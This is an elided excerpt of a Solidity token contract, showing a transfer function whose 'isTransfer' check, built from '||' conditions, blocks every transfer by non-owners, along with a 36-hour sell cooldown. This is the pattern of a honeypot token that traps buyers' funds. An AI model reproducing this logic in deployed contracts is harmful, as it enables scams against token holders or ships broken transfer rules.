...
contract TEST is Context, IERC20, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping) {
            ...
            bool isTransfer = (to != uniswapV2Pair || to != address(uniswapV2Router) || to != address(this)) && (from != uniswapV2Pair || from != address(uniswapV2Router) || from != address(this));
            require(!isTransfer, "Transfers are not allowed.");
            ...
            if (to == uniswapV2Pair && from != address(uniswapV2Router) && !_isExcludedFromFee[from]) {
                ...
                if (cooldownEnabled && !_isExcludedFromSellLock[from]) {
                    require(cooldown[to] < block.timestamp, "_transfer:: Transfer Delay enabled.  Try again later.");
                    cooldown[to] = block.timestamp + (36 hours);
                }
            }
        }
